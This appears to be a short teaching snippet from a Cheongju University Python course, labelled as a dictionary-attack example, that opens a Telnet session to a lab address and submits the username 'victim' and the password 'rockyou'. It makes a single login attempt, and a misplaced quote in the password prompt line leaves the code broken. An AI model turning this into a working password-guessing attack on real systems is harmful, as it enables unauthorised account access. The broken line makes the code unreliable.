# All-by-Pythonself
# Snippet for dictionary attacks
# by Hae Young Lee
# at Cheongju University

import os
import telnetlib

t = telnetlib . Telnet ("10.0.2.4")
t . read_until ("login: ")
t . write ("victim\n")
t . read_until ("Password": ")
t . write ("rockyou\n")

t . close ()
